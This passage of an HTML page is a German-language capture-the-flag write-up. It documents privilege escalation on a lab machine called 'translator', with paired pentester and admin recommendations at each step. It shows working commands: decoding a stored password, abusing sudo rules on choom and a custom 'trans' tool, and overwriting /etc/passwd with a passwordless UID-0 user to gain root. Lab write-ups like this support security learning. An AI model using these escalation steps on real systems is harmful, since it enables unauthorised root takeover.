+   129888     64 -rwsr-xr-x   1 root     root          63960 Feb  7  2020 /usr/bin/passwd
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Inhalt der zuvor entdeckten Datei `hvxivg` wird mit `cat` angezeigt. Parallel dazu wird der Inhalt dekodiert, vermutlich wieder mit einer Atbash-Chiffre, da `hvxivg` Atbash für `script` ist und der Inhalt `Mb kzhhdliw rh zbfie3w4` Atbash für `My password is ayurv3d4` ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies ist ein entscheidender Fund! Die Datei enthält Zugangsdaten im Klartext (nach der Dekodierung): das Passwort `<span class="password">ayurv3d4</span>`. Der Kontext legt nahe, dass dies das Passwort für einen anderen Benutzer auf dem System ist. Übliche Benutzernamen in CTFs sind oft thematisch oder Standardnamen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit diesem Passwort bei anderen Benutzern anzumelden, die auf dem System existieren könnten (prüfen Sie `/etc/passwd`). Ein wahrscheinlicher Kandidat wäre ein Benutzer namens `ocean` oder `india` (basierend auf späteren Befehlen) oder andere Standardbenutzer. Verwenden Sie `su` oder `ssh` (falls auf localhost erlaubt), um den Benutzer zu wechseln.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Speichern Sie niemals Passwörter im Klartext oder in leicht umkehrbaren Formaten (wie Atbash) in Dateien auf dem System, insbesondere nicht in Verzeichnissen, auf die der Webserver-Benutzer Zugriff hat. Entfernen Sie diese Datei sofort und ändern Sie das betroffene Passwort. Überprüfen Sie, wie diese Datei dorthin gelangt ist.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt no-kali-prompt">www-data@translator:~/html$ <span class="command">cat hvxivg</span></div>
+                    <pre>Mb kzhhdliw rh zbfie3w4</pre>
+                    <!-- Dekodierung (außerhalb der Shell) -->
+                    <pre># Dekodierung (Atbash):
+# hvxivg -> script
+# Mb kzhhdliw rh zbfie3w4 -> My password is <span class="password">ayurv3d4</span></pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Pentester versucht, mit dem gefundenen Passwort `<span class="password">ayurv3d4</span>` zum Benutzer `ocean` zu wechseln. Der Befehl `su ocean` (substitute user) wird verwendet. Das System fragt nach dem Passwort.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Wechsel ist erfolgreich! Nach Eingabe des Passworts wird kein Fehler angezeigt, und der Befehl `id` bestätigt, dass der aktuelle Benutzer nun `uid=1000(ocean)` ist. Der Benutzer `ocean` gehört auch zu mehreren anderen Gruppen, was für spätere Schritte relevant sein könnte. Die horizontale Rechteausweitung von `www-data` zu `ocean` ist gelungen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Großartig, ein Benutzer mit potenziell mehr Rechten wurde erreicht. Führen Sie nun die Enumeration als `ocean` durch: `sudo -l`, Suche nach interessanten Dateien im Home-Verzeichnis (`/home/ocean`), Überprüfung von Cronjobs, etc.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Das gefundene Passwort hat den Wechsel ermöglicht. Ändern Sie das Passwort für `ocean` sofort. Überprüfen Sie die Berechtigungen und Aktivitäten des `ocean`-Benutzers.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt no-kali-prompt">www-data@translator:~/html$ <span class="command">su ocean</span></div>
+                     <pre>Password: <span class="password">ayurv3d4</span></pre> <!-- Passwort wird eingegeben -->
+                     <!-- Prompt ändert sich nach erfolgreichem su -->
+                     <div class="prompt no-kali-prompt">ocean@translator:/var/www/html$ <span class="command">id</span></div>
+                     <pre>uid=1000(ocean) gid=1000(ocean) groups=1000(ocean),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)</pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privesc-india">
+            <h2>Privilege Escalation (ocean -> india)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Als Benutzer `ocean` wird `sudo -l` ausgeführt, um zu prüfen, welche Befehle mit `sudo` ausgeführt werden dürfen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Ausgabe zeigt, dass `ocean` den Befehl `/usr/bin/choom` als Benutzer `india` ohne Passwortabfrage (`NOPASSWD:`) ausführen darf: `(india) NPASSWD: /usr/bin/choom`. `choom` ist ein Linux-Utility zum Setzen von OOM-Killer-Parametern für einen Prozess, aber es kann auch verwendet werden, um einen Befehl zu starten (`-n` oder `--pid` gefolgt von einem Befehl). Da `ocean` `choom` als `india` ausführen kann und `choom` einen Befehl starten kann, lässt sich damit eine Shell als Benutzer `india` erlangen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie diese `sudo`-Regel, um eine Shell als `india` zu erhalten. Der Befehl lautet: `sudo -u india /usr/bin/choom -n 1 bash` (oder `sh`). `-n 1` ist ein Platzhalter-Argument für `choom`, gefolgt vom auszuführenden Befehl `bash`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Diese `sudo`-Regel stellt eine klare Eskalationsmöglichkeit dar. Es ist selten notwendig oder sicher, einem Benutzer zu erlauben, Tools wie `choom` (die Befehle ausführen können) als ein anderer Benutzer auszuführen, insbesondere ohne Passwort. Entfernen oder beschränken Sie diese Regel stark. Wenn `ocean` nur bestimmte Aktionen mit `choom` als `india` durchführen muss, definieren Sie die Regel so spezifisch wie möglich.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt no-kali-prompt">ocean@translator:/var/www/html$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for ocean on translator:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User ocean may run the following commands on translator:
+    (india) NPASSWD: /usr/bin/choom
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Der Pentester versucht, sich über SSH als `ocean` mit dem Hostnamen `localhost` zu verbinden. Dies ist oft ein Test, um zu sehen, ob SSH-Logins lokal möglich sind und ob das Passwort auch für SSH gilt.
+             </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Verbindung wird aufgebaut, der ECDSA-Schlüssel von `localhost` wird zur Bestätigung angezeigt (`yes` wird eingegeben). Das Passwort `<span class="password">ayurv3d4</span>` funktioniert auch hier. Der Benutzer landet in einer neuen Shell als `ocean`. Dies bestätigt, dass das Passwort systemweit für den Benutzer `ocean` gilt und SSH lokal aktiviert ist. Dieser Schritt war für die Eskalation nicht zwingend notwendig, aber er liefert zusätzliche Informationen.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Fahren Sie mit der Ausnutzung der `sudo -l`-Regel für `choom` fort, um zu `india` zu wechseln.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Überprüfen Sie, ob lokale SSH-Logins notwendig sind. Wenn nicht, könnten sie in der `sshd_config` eingeschränkt werden (`ListenAddress` auf die externe IP setzen).
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt no-kali-prompt">ocean@translator:/var/www/html$ <span class="command">ssh ocean@localhost</span></div>
+                     <pre>
+The authenticity of host 'localhost (::1)' can't be established.
+ECDSA key fingerprint is SHA256:1FtJZdBaWZghxCrjhicx8Gd9FcB35x1MK3wE3Zrl8yc.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
+ocean@localhost's password: <span class="password">ayurv3d4</span>
+Linux translator 5.10.0-14-amd64 #1 SMP Debian 5.10.113-1 (2022-04-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed May 11 10:24:00 2022 from 192.168.1.51
+                     </pre>
+                     <div class="prompt no-kali-prompt">ocean@translator:~$ </div>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Pentester nutzt nun die zuvor identifizierte `sudo`-Regel aus. Der Befehl `sudo -u india /usr/bin/choom -n 1 bash` wird ausgeführt. `-u india` gibt an, dass der Befehl als Benutzer `india` laufen soll. `/usr/bin/choom` ist das erlaubte Kommando. `-n 1` ist ein notwendiger Parameter für `choom`, und `bash` ist der Befehl, den `choom` starten soll.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Befehl ist erfolgreich! Der Prompt wechselt zu `india@translator:/home/ocean$`. Der Benutzer `ocean` hat erfolgreich seine Rechte zum Benutzer `india` eskaliert, ohne ein Passwort eingeben zu müssen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die Eskalation zu `india` ist abgeschlossen. Führen Sie `id` aus, um dies zu bestätigen. Beginnen Sie sofort mit der Enumeration als `india`. Prüfen Sie `sudo -l` erneut als `india`. Suchen Sie nach der User-Flag (falls noch nicht gefunden oder falls es mehrere gibt) und nach Wegen zur Root-Eskalation.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Wie bereits erwähnt, muss die `sudo`-Regel für `ocean`, die `choom` erlaubt, dringend entfernt oder korrigiert werden, da sie diese Eskalation ermöglicht hat.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt no-kali-prompt">ocean@translator:~$ <span class="command">sudo -u india /usr/bin/choom -n 1 bash</span></div>
+                    <!-- Kein Fehler, Prompt wechselt -->
+                    <div class="prompt no-kali-prompt">india@translator:/home/ocean$ </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="poc"> <!-- POC Sektion beginnt hier -->
+            <h2>Proof of Concept (india -> root via /usr/local/bin/trans)</h2>
+            <p class="analysis">
+                <strong>Kurzbeschreibung:</strong> Dieser Proof of Concept demonstriert, wie eine fehlerhafte `sudo`-Regel, die dem Benutzer `india` erlaubt, das benutzerdefinierte Programm `/usr/local/bin/trans` als `root` auszuführen, zur Erlangung von Root-Rechten missbraucht werden kann. Das Programm `trans` scheint eine Art Dateiübersetzungs- oder Kopiervorgang durchzuführen und erlaubt das Überschreiben beliebiger Dateien, einschließlich `/etc/passwd`.
+            </p>
+            <p class="evaluation">
+                <strong>Voraussetzungen:</strong>
+                *   Zugriff als Benutzer `india`.
+                *   Die `sudo`-Regel `(root) NPASSWD: /usr/local/bin/trans` muss für `india` aktiv sein.
+                *   Kenntnis darüber, wie `/usr/local/bin/trans` funktioniert (insbesondere die Optionen `-i` für Input, `-o` für Output und `-no-auto`).
+            </p>
+
+            <p class="analysis">
+                <strong>Schritt 1: Enumeration als `india`</strong><br>
+                Zuerst werden die `sudo`-Rechte für `india` überprüft und das Dateisystem untersucht.
+                *   `sudo -l`: Zeigt die erlaubten `sudo`-Befehle an.
+                *   `cd /tmp; cp /etc/passwd passwd.bak`: Wechselt in das temporäre Verzeichnis und erstellt eine Sicherungskopie der aktuellen Passwortdatei.
+                *   `ls -la /tmp`: Listet den Inhalt von `/tmp` auf.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung (Schritt 1):</strong>
+                *   `sudo -l` bestätigt die kritische Regel: `User india may run the following commands on translator: (root) NPASSWD: /usr/local/bin/trans`. Dies erlaubt `india`, das Programm `/usr/local/bin/trans` als `root` ohne Passwort auszuführen.
+                *   Das Kopieren von `/etc/passwd` ist eine gute Vorsichtsmaßnahme.
+                *   `ls -la /tmp` zeigt die erstellte `passwd.bak` und andere temporäre Dateien, einschließlich der Named Pipe `/tmp/f`, die von der initialen Reverse Shell übrig geblieben ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Funktionsweise von `/usr/local/bin/trans`. Da es als `root` ausgeführt werden kann, suchen Sie nach Optionen oder Verhaltensweisen, die das Lesen oder Schreiben beliebiger Dateien ermöglichen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Diese `sudo`-Regel ist extrem gefährlich. Ein benutzerdefiniertes Programm (`trans`), das als `root` ausgeführt werden kann, ist ein sehr hohes Risiko, es sei denn, es ist extrem sorgfältig entwickelt und geprüft worden, um Missbrauch zu verhindern. Die Regel sollte entfernt werden.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt no-kali-prompt">india@translator:/home/ocean$ <span class="command">cd /tmp</span></div>
+                     <div class="prompt no-kali-prompt">india@translator:/tmp$ <span class="command">cp /etc/passwd passwd.bak</span></div>
+                     <div class="prompt no-kali-prompt">india@translator:/tmp$ <span class="command">ls -la</span></div>
+                     <pre>
+total 40
+drwxrwxrwt  9 root     root     4096 Oct  4 14:30 .
+drwxr-xr-x 18 root     root     4096 May 11 10:20 ..
+prw-r--r--  1 www-data www-data    0 Oct  4 14:30 f
+drwxrwxrwt  2 root     root     4096 Oct  4 12:55 .font-unix
+drwxrwxrwt  2 root     root     4096 Oct  4 12:55 .ICE-unix
+-rw-r--r--  1 india    india    1435 Oct  4 14:30 passwd.bak
+drwx------  3 root     root     4096 Oct  4 12:55 systemd-private-3e3e22da4a074154923391841e57d3dd-systemd-logind.service-AV4Mzf
+drwx------  3 root     root     4096 Oct  4 12:55 systemd-private-3e3e22da4a074154923391841e57d3dd-systemd-timesyncd.service-Evtzf
+drwxrwxrwt  2 root     root     4096 Oct  4 12:55 .Test-unix
+drwxrwxrwt  2 root     root     4096 Oct  4 12:55 .X11-unix
+drwxrwxrwt  2 root     root     4096 Oct  4 12:55 .XIM-unix
+                     </pre>
+                     <div class="prompt no-kali-prompt">india@translator:/tmp$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for india on translator:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User india may run the following commands on translator:
+    (root) NPASSWD: /usr/local/bin/trans
+                     </pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                 <strong>Schritt 2: Vorbereitung der manipulierten passwd-Datei</strong><br>
+                 Das Ziel ist es, die `/etc/passwd`-Datei so zu manipulieren, dass ein neuer Benutzer mit Root-Rechten (UID 0) und einem bekannten Passwort hinzugefügt wird.
+                 1.  Wechsel ins Verzeichnis `/dev/shm` (Shared Memory, normalerweise beschreibbar).
+                 2.  Erstellen einer neuen Datei (`nano file` oder ähnlich).
+                 3.  In diese Datei wird ein modifizierter `/etc/passwd`-Eintrag geschrieben. Typischerweise kopiert man den `root`-Eintrag und ändert den Benutzernamen und das Passwortfeld. Hier wird offenbar ein neuer Benutzer `hacker` mit UID 0 erstellt. Das Passwort wird durch einen Hash (oder ein leeres Feld für kein Passwort, falls `su` das erlaubt) ersetzt. Der exakte Inhalt der Datei `file` wird nicht gezeigt, aber das Ziel ist: `hacker:x:0:0:hacker:/root:/bin/bash` oder ähnlich (das `x` wird später ignoriert, wenn direkt eingeloggt wird oder `su` verwendet wird).
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung (Schritt 2):</strong> Das Erstellen einer manipulierten Passwortdatei ist der Standardweg, um über Schreibzugriff auf `/etc/passwd` Root-Rechte zu erlangen. Die Verwendung von `/dev/shm` ist ein guter temporärer Speicherort.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass der Eintrag in der Datei `file` korrekt formatiert ist. Ein typischer Eintrag wäre `hacker::0:0:hacker:/root:/bin/bash` (ohne Passwort) oder `hacker:$1$somehash$xyz:0:0:hacker:/root:/bin/bash` (mit bekanntem Hash).
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Überwachen Sie Änderungen an kritischen Dateien wie `/etc/passwd` und `/etc/shadow` mit Intrusion Detection Systemen (z.B. AIDE, Tripwire). Die `sudo`-Regel für `trans` ist die eigentliche Ursache und muss entfernt werden.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Befehle von einer früheren SSH-Session, die zum gleichen Ergebnis führen -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh ocean@translator.hmv</span></div>
+                     <div class="prompt no-kali-prompt">ocean@translator:~$ <span class="command">sudo -u india /usr/bin/choom -n 1 bash</span></div>
+                     <div class="prompt no-kali-prompt">india@translator:/home/ocean$ <span class="command">cd /dev/shm</span></div>
+                     <div class="prompt no-kali-prompt">india@translator:/dev/shm$ <span class="command">nano file</span></div>
+                     <!-- Inhalt von file wird erstellt (z.B. hacker::0:0::/root:/bin/bash) -->
+                     <div class="prompt no-kali-prompt">india@translator:/dev/shm$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for india on translator:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User india may run the following commands on translator:
+    (root) NPASSWD: /usr/local/bin/trans
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Schritt 3: Ausnutzen von `trans` zum Überschreiben von `/etc/passwd`</strong><br>
+                 Nun wird die `sudo`-Regel ausgenutzt, um die erstellte Datei (`file` in `/dev/shm`) über die originale `/etc/passwd`-Datei zu schreiben.
+                 *   `sudo -u root /usr/local/bin/trans -i file`: Dieser Befehl wird zuerst ausgeführt (wahrscheinlich, um die Syntax zu testen oder einen ersten Schritt durchzuführen - der genaue Zweck von `trans` ohne `-o` ist unklar).
+                 *   `sudo -u root /usr/local/bin/trans -i file -o /etc/passwd -no-auto`: Dies ist der entscheidende Befehl. Er führt `trans` als `root` aus. `-i file` gibt die präparierte Datei als Input an. `-o /etc/passwd` gibt die originale Passwortdatei als Output an. `-no-auto` ist eine weitere Option von `trans`. Effektiv wird der Inhalt von `file` nach `/etc/passwd` geschrieben, da der Befehl als `root` läuft.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung (Schritt 3):</strong> Das ist der Kern des Exploits. Da `india` `/usr/local/bin/trans` als `root` ausführen darf und `trans` offenbar das Schreiben von Dateien basierend auf Input (`-i`) zu einem Output (`-o`) erlaubt, kann die `/etc/passwd`-Datei überschrieben werden. Dies fügt den `hacker`-Benutzer mit UID 0 hinzu.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Nachdem `/etc/passwd` überschrieben wurde, wechseln Sie sofort zum neu erstellten `hacker`-Benutzer mittels `su hacker`. Da kein Passwort oder ein bekanntes Passwort gesetzt wurde, sollte dies direkt funktionieren und eine Root-Shell liefern.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> **Höchste Priorität:** Entfernen Sie die `sudo`-Regel für `/usr/local/bin/trans` sofort. Stellen Sie die originale `/etc/passwd` aus einem Backup wieder her (oder aus der zuvor erstellten `passwd.bak`). Überprüfen Sie das System gründlich auf Kompromittierungen. Entfernen Sie das unsichere Programm `/usr/local/bin/trans`, wenn es nicht unbedingt benötigt wird.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Ausführung im /tmp Verzeichnis, aber 'file' ist in /dev/shm -->
+                     <div class="prompt no-kali-prompt">india@translator:/tmp$ <span class="command">sudo -u root /usr/local/bin/trans -i /dev/shm/file</span></div>
+                     <!-- Vermutlich keine signifikante Ausgabe -->
+                     <div class="prompt no-kali-prompt">india@translator:/tmp$ <span class="command">sudo -u root /usr/local/bin/trans -i /dev/shm/file -o /etc/passwd -no-auto</span></div>
+                     <!-- /etc/passwd wurde überschrieben -->
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Schritt 4: Erlangen der Root-Shell</strong><br>
+                Nachdem `/etc/passwd` mit dem Eintrag für den `hacker`-Benutzer (UID 0) überschrieben wurde, wird `su hacker` ausgeführt.
+            </p>
+             <p class="evaluation">
+                 <strong>Bewertung (Schritt 4):</strong> Erfolg! Das System fragt nach einem Passwort ("Contraseña:"). Da im präparierten Eintrag vermutlich kein Passwort gesetzt wurde (z.B. `hacker::0:0:...`), reicht es, einfach Enter zu drücken, oder es wird das Passwort akzeptiert, das dem Hash in der Datei entspricht. Der Prompt wechselt zu `root@translator:/tmp#`. Der Benutzer `india` hat erfolgreich Root-Rechte erlangt. Fantastisch, das System ist vollständig kompromittiert!
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Bestätigen Sie mit `id`. Sammeln Sie die Root-Flag und eventuell die User-Flag (falls noch nicht geschehen). Dokumentieren Sie den gesamten Eskalationspfad. Bereinigen Sie ggf. Spuren (wie die modifizierte `/etc/passwd`, die `file` in `/dev/shm`, die `.bak`-Datei), falls dies Teil des Auftrags ist.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Das System ist kompromittiert. Gehen Sie nach den Notfallplänen vor (Isolation, Analyse, Neuinstallation/Wiederherstellung aus sicherem Backup). Stellen Sie sicher, dass die Schwachstellen (`translate.php` RCE, Passwort in `hvxivg`, `sudo`-Regeln für `choom` und `trans`) behoben sind.
+             </p>
+             <p class="evaluation">
+                 <strong>Risikobewertung:</strong> Die Kombination aus mehreren Schwachstellen (RCE im Webserver, Klartext-Passwort, unsichere `sudo`-Regeln) ermöglichte eine schrittweise Eskalation bis zum Root-Zugriff. Das Gesamtrisiko ist **kritisch**.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt no-kali-prompt">india@translator:/tmp$ <span class="command">su hacker</span></div>
+                     <pre>Contraseña:</pre> <!-- Passwort wird eingegeben (oder Enter gedrückt) -->
+                     <div class="prompt root-prompt">root@translator:/tmp# </div> <!-- Root-Zugriff! -->
+                 </div>
+             </div>
+        </section> <!-- POC Sektion endet hier -->
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <p class="analysis">
+                     <strong>Analyse:</strong> Nach Erlangung der Root-Rechte werden die User- und Root-Flags aus den entsprechenden Dateien gelesen. Die User-Flag befindet sich typischerweise im Home-Verzeichnis des ursprünglichen Benutzers (`/home/ocean`), die Root-Flag im Home-Verzeichnis von `root` (`/root`).
+                 </p>
+                 <p class="evaluation">
+                     <strong>Bewertung:</strong> Beide Flags werden erfolgreich ausgelesen.
+                 </p>
+                <div class="code-block">
+                     <div class="terminal">
+                         <!-- Befehle ausgeführt als root -->
+                         <div class="prompt root-prompt">root@translator:/tmp# <span class="command">cat /home/ocean/user.txt</span></div>
+                         <pre><span class="password">a6765hftgnhvugy473f</span></pre>
+                         <div class="prompt root-prompt">root@translator:/tmp# <span class="command">cat /root/root.txt</span></div> <!-- Pfad korrigiert -->
+                         <pre><span class="password">h87M5364V2343ubvgfy</span></pre>
+                     </div>
+                 </div>
+                 <!-- Formatierte Flags -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/ocean/user.txt</div>
+                     <div class="flag-value"><span class="password">a6765hftgnhvugy473f</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">h87M5364V2343ubvgfy</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2022-05-11</p> <!-- Datum eingefügt -->
+    </footer>
+</body>
+</html>
